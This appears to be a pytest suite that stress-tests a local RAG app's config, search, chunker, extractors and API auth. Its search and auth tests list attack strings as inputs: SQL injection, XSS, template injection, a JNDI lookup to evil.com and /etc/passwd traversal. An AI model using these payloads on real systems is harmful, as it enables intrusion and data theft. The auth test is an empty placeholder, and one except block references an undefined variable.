# -*- coding: utf-8 -*-
"""
test_break_it.py - Tests Designed to ACTUALLY Break Things
==========================================================
These tests use REAL components, not mocks. They're designed to find actual bugs.
If these all pass, the code is genuinely robust.
"""

import pytest
import sys
import os
import tempfile
import shutil
import json
import time
import threading
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


# =============================================================================
# 1. REAL CONFIG SYSTEM TESTS
# =============================================================================
class TestRealConfigBreaking:
    """Actually try to break the config system."""

    def test_modify_config_at_runtime(self):
        """Modifying config at runtime - does it cause issues?"""
        from config_system import config

        original_port = config.llm_port

        # Try to modify (dataclass should allow this)
        config.llm_port = 9999
        assert config.llm_port == 9999

        # Restore
        config.llm_port = original_port

    def test_config_with_none_values(self):
        """What happens if config values are None?"""
        from config_system import config

        # Store original
        original = config.external_llm.anthropic_api_key

        # Set to None (should this crash?)
        config.external_llm.anthropic_api_key = None

        # Try to use it
        key = config.external_llm.anthropic_api_key
        assert key is None

        # Restore
        config.external_llm.anthropic_api_key = original

    def test_settings_json_race_condition(self, tmp_path):
        """Simulate race condition on settings.json read/write."""
        settings_file = tmp_path / "settings.json"

        errors = []

        def writer():
            """Writer."""
            for i in range(50):
                try:
                    data = {"test": i, "nested": {"value": i * 2}}
                    settings_file.write_text(json.dumps(data))
                except Exception as e:
                    errors.append(f"write: {e}")

        def reader():
            """Reader."""
            for _ in range(50):
                try:
                    if settings_file.exists():
                        content = settings_file.read_text()
                        if content.strip():
                            json.loads(content)
                except json.JSONDecodeError as e:
                    # This is the bug we're looking for!
                    errors.append(f"JSON decode race: {e}")
                except Exception as e:
                    errors.append(f"read: {e}")

        threads = [
            threading.Thread(target=writer),
            threading.Thread(target=reader),
            threading.Thread(target=reader),
        ]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        # If we found race conditions, report them
        if errors:
            print(f"\n⚠️ Found {len(errors)} race condition issues!")
            for e in errors[:5]:
                print(f"  - {e}")
                pass
            # This is a REAL bug if it happens
            pytest.fail(f"Race condition detected: {errors[0]}")


# =============================================================================
# 2. REAL RAG PIPELINE TESTS
# =============================================================================
class TestRealRAGBreaking:
    """Actually use the RAG pipeline and try to break it."""

    @pytest.fixture
    def rag_instance(self, tmp_path):
        """Create a real RAG instance for testing."""
        from zena_mode.rag_pipeline import LocalRAG

        cache_dir = tmp_path / "rag_test"
        cache_dir.mkdir()

        # Force CPU to avoid 'meta tensor' errors during test concurrency
        from config_system import config

        original_gpu = config.rag.use_gpu
        config.rag.use_gpu = False

        rag = LocalRAG(cache_dir=cache_dir)
        yield rag

        # Restore
        config.rag.use_gpu = original_gpu

        # Cleanup
        rag.close()
        shutil.rmtree(cache_dir, ignore_errors=True)

    def test_index_empty_documents(self, rag_instance):
        """Index empty documents - should handle gracefully."""
        empty_docs = [
            {"content": "", "url": "http://test.com", "title": "Empty"},
            {"content": "   ", "url": "http://test2.com", "title": "Whitespace"},
            {"content": None, "url": "http://test3.com", "title": "None"},
        ]

        # Should not crash
        rag_instance.build_index(empty_docs)

        # Should have no results
        results = rag_instance.search("anything", k=5)
        assert isinstance(results, list)

    def test_search_before_index(self, rag_instance):
        """Search on empty index - should not crash."""
        results = rag_instance.search("test query", k=5)
        assert isinstance(results, list)
        assert len(results) == 0

    def test_index_duplicate_documents(self, rag_instance):
        """Index the same document multiple times."""
        doc = {
            "content": "This is a test document about artificial intelligence.",
            "url": "http://test.com/same",
            "title": "Same Doc",
        }

        # Index same doc 10 times
        for _ in range(10):
            rag_instance.build_index([doc])

        # Should deduplicate
        count = rag_instance.ntotal
        assert count <= 2, f"Expected dedup, got {count} entries"

    def test_search_with_special_characters(self, rag_instance):
        """Search with SQL injection, XSS, etc."""
        # First add some content
        docs = [{"content": "Normal document about Python programming.", "url": "http://test.com", "title": "Python"}]
        rag_instance.build_index(docs)

        # Try dangerous queries
        dangerous_queries = [
            "'; DROP TABLE chunks; --",
            "<script>alert('xss')</script>",
            "{{7*7}}",
            "${jndi:ldap://evil.com}",
            "../../../etc/passwd",
            "\x00\x00\x00",
            "A" * 10000,  # Very long query
        ]

        for query in dangerous_queries:
            try:
                results = rag_instance.search(query, k=3)
                assert isinstance(results, list)
            except Exception as e:
                pytest.fail(f"Search crashed on dangerous query: {query[:30]}: {e}")

    def test_concurrent_index_and_search(self, rag_instance):
        """Index and search at the same time."""
        errors = []

        def indexer():
            """Indexer."""
            for i in range(20):
                try:
                    doc = {
                        "content": f"Document number {i} about topic {i % 5}.",
                        "url": f"http://test.com/{i}",
                        "title": f"Doc {i}",
                    }
                    rag_instance.build_index([doc])
                except Exception as e:
                    errors.append(f"index: {e}")

        def searcher():
            """Searcher."""
            for _ in range(20):
                try:
                    rag_instance.search("document topic", k=3)
                except Exception as e:
                    errors.append(f"search: {e}")

        threads = [
            threading.Thread(target=indexer),
            threading.Thread(target=searcher),
            threading.Thread(target=searcher),
        ]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        if errors:
            pytest.fail(f"Concurrent access failed: {errors[0]}")

    def test_cache_consistency(self, rag_instance):
        """Test that cache doesn't return stale results after update."""
        # Add initial doc with enough content to not get filtered
        doc1 = {
            "content": "The secret password is BlueSky123. " * 20,  # Make it long enough
            "url": "http://test.com/1",
            "title": "Secret",
        }
        rag_instance.build_index([doc1])

        # Search (should cache)
        rag_instance.search("secret password", k=3)
        # New cache system uses SemanticCache object
        initial_cache_size = len(rag_instance.cache._exact_cache) + len(rag_instance.cache._semantic_cache)
        assert initial_cache_size > 0, "Search should populate cache"

        # Add different doc
        doc2 = {
            "content": "The new password is RedCloud456. " * 20,  # Make it long enough
            "url": "http://test.com/2",
            "title": "New Secret",
        }
        rag_instance.build_index([doc2])

        # Cache should be cleared after build_index
        cache_after_build = len(rag_instance.cache._exact_cache) + len(rag_instance.cache._semantic_cache)
        assert cache_after_build == 0, f"Cache should be cleared after build_index, got {cache_after_build}"

        # Search again - should find from fresh query
        results2 = rag_instance.search("password", k=5)

        # Should find results from both docs now
        assert len(results2) >= 2, f"Should find results from both docs, got {len(results2)}"


# =============================================================================
# 3. CHUNKER EDGE CASES
# =============================================================================
class TestChunkerBreaking:
    """Try to break the text chunker."""

    @pytest.fixture
    def chunker(self):
        from zena_mode.chunker import TextChunker

        return TextChunker()

    def test_chunk_binary_data(self, chunker):
        """Binary data in text."""
        binary_text = "Hello\x00World\x01\x02\x03End" * 100

        try:
            result = chunker.chunk_document(binary_text, metadata={})
            assert isinstance(result, list)
        except Exception as e:
            pytest.fail(f"Chunker crashed on binary: {e}")

    def test_chunk_only_newlines(self, chunker):
        """Text that's only newlines."""
        newlines = "\n" * 10000

        result = chunker.chunk_document(newlines, metadata={})
        # Should return empty or minimal chunks
        assert isinstance(result, list)

    def test_chunk_mixed_encodings(self, chunker):
        """Text with mixed character encodings."""
        mixed = "ASCII: Hello | UTF-8: 你好 | Emoji: 🎉 | Arabic: مرحبا | Math: ∑∫∂"

        result = chunker.chunk_document(mixed * 100, metadata={})
        assert isinstance(result, list)
        assert len(result) > 0

    def test_chunk_extremely_long_word(self, chunker):
        """Document with one extremely long word."""
        long_word = "a" * 50000

        result = chunker.chunk_document(long_word, metadata={})
        assert isinstance(result, list)


# =============================================================================
# 4. UTILS BREAKING
# =============================================================================
class TestUtilsBreaking:
    """Try to break utility functions."""

    def test_normalize_input_extremes(self):
        """Extreme inputs for normalize_input."""
        from utils import normalize_input

        extremes = [
            None,
            "",
            " " * 10000,
            "\n" * 5000,
            "\t" * 5000,
            "x" * 100000,
            "\x00" * 1000,
        ]

        for inp in extremes:
            try:
                result = normalize_input(inp)
                # Should return None or string
                assert result is None or isinstance(result, str)
            except Exception as e:
                pytest.fail(f"normalize_input crashed on {repr(inp)[:30]}: {e}")

    def test_safe_print_with_encoding_issues(self, capsys):
        """safe_print with encoding problems."""
        from utils import safe_print

        problematic = [
            "Normal text",
            "Emoji: 🎉🔥💯",
            "Chinese: 你好世界",
            "Arabic: مرحبا",
            "Math: ∑∫∂∇",
            "Control: \x00\x01\x02",
            "Mixed: Hello 你好 🎉 مرحبا",
        ]

        for text in problematic:
            try:
                safe_print(text)
            except Exception as e:
                pytest.fail(f"safe_print crashed on: {text[:20]}: {e}")


# =============================================================================
# 5. API SERVER TESTS (if running)
# =============================================================================
class TestAPIBreaking:
    """Test API endpoints for breaking points."""

    def test_api_auth_header_manipulation(self):
        """Test various auth header manipulations."""
        import os
        from zena_mode.asgi_server import app, API_KEY, API_KEY_HEADER

        # If no API key set, should allow all
        if not API_KEY:
            pytest.skip("API_KEY not set, skipping auth tests")

        # Various header attacks
        [
            {"X-API-Key": ""},
            {"X-API-Key": "wrong"},
            {"X-API-Key": "' OR '1'='1"},
            {"X-Api-Key": API_KEY},  # Wrong case
            {"X-API-Key": API_KEY + " "},  # Trailing space
            {"X-API-Key": " " + API_KEY},  # Leading space
        ]

        # These should all be rejected
        # (Can't actually test without running server)
        assert True  # Placeholder


# =============================================================================
# 6. PROCESS MANAGEMENT TESTS
# =============================================================================
class TestProcessManagement:
    """Test process management utilities."""

    def test_kill_nonexistent_process(self):
        """Kill a process that doesn't exist."""
        from utils import ProcessManager

        # PID that almost certainly doesn't exist
        fake_pid = 999999999

        # Should not crash
        try:
            ProcessManager.kill_tree(fake_pid)
        except Exception as e:
            pytest.fail(f"kill_tree crashed on fake PID: {e}")

    def test_prune_when_no_zombies(self):
        """Prune when there are no zombie processes."""
        from utils import ProcessManager

        # Should not crash or hang
        try:
            # This might take a moment
            import asyncio

            loop = asyncio.new_event_loop()
            loop.run_until_complete(ProcessManager.prune())
            loop.close()
        except Exception:
            # Some exceptions are expected (no zombies to prune)
            pass


# =============================================================================
# 7. DATA PERSISTENCE TESTS
# =============================================================================
class TestDataPersistence:
    """Test data persistence edge cases."""

    def test_corrupted_rag_storage(self, tmp_path):
        """What happens if RAG storage is corrupted?"""
        from zena_mode.rag_pipeline import LocalRAG

        cache_dir = tmp_path / "corrupted_rag"
        cache_dir.mkdir()

        # Create some fake corrupted files
        (cache_dir / "collection").mkdir()
        (cache_dir / "collection" / "data.bin").write_bytes(b"CORRUPTED DATA")

        try:
            # Try to load - might fail, but shouldn't crash hard
            rag = LocalRAG(cache_dir=cache_dir)
            rag.close()
        except Exception:
            # Expected to fail, but shouldn't be an unhandled crash
            print(f"Expected failure on corrupted storage: {e}")
            pass

    def test_read_only_directory(self, tmp_path):
        """What happens if directory is read-only?"""
        if os.name == "nt":  # Windows
            pytest.skip("Read-only test not reliable on Windows")

        cache_dir = tmp_path / "readonly_rag"
        cache_dir.mkdir()

        # Make it read-only
        os.chmod(cache_dir, 0o444)

        try:
            from zena_mode.rag_pipeline import LocalRAG

            rag = LocalRAG(cache_dir=cache_dir)
            rag.close()
        except PermissionError:
            # Expected
            pass
        except Exception as e:
            pytest.fail(f"Unexpected error on read-only dir: {e}")
        finally:
            # Restore permissions for cleanup
            os.chmod(cache_dir, 0o755)


# =============================================================================
# 8. MULTI-MODAL BREAKING (New)
# =============================================================================
class TestMultiModalBreaking:
    """Break the shiny new Multi-modal features."""

    @pytest.fixture
    def chunker(self):
        from zena_mode.chunker import TextChunker

        return TextChunker()

    def test_pdf_extractor_garbage_binary(self, tmp_path):
        """Feed random binary garbage to PDF extractor."""
        from zena_mode.universal_extractor import UniversalExtractor, DocumentType

        # Create garbage file
        garbage_path = tmp_path / "garbage.pdf"
        garbage_path.write_bytes(os.urandom(1024 * 10))  # 10KB random junk

        extractor = UniversalExtractor(vision_enabled=False)
        try:
            # Should not crash, just return empty or error log
            chunks, stats = extractor.process(garbage_path, document_type=DocumentType.PDF)
            assert isinstance(chunks, list)
            # Typically expects empty list or stats indicating failure
        except Exception as e:
            # Should catch internal PDF errors
            pytest.fail(f"Extractor crashed on garbage PDF: {e}")

    def test_email_ingestor_malformed_mbox(self, tmp_path):
        """Feed corrupted MBOX."""
        from zena_mode.email_ingestor import EmailIngestor

        bad_mbox = tmp_path / "corrupt.mbox"
        with open(bad_mbox, "w") as f:
            f.write("From nobody Fri Jan 1 00:00:00 1990\n")
            f.write("Invalid Headers Here\n")
            f.write("Body without blank line\n")

        ingestor = EmailIngestor()
        try:
            docs = ingestor.ingest(str(bad_mbox))
            assert isinstance(docs, list)
        except Exception as e:
            pytest.fail(f"Ingestor crashed on bad MBOX: {e}")

    def test_massive_file_handling(self, tmp_path):
        """Create a 'large' dummy file and ensure no MemoryError."""
        # 10MB dummy file
        large_file = tmp_path / "large_dummy.txt"
        with open(large_file, "wb") as f:
            f.write(b"0" * (10 * 1024 * 1024))

        from zena_mode.universal_extractor import UniversalExtractor

        extractor = UniversalExtractor(vision_enabled=False)

        # Should process or reject gracefully
        chunks, stats = extractor.process(large_file)
        assert isinstance(chunks, list)


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short", "-x"])
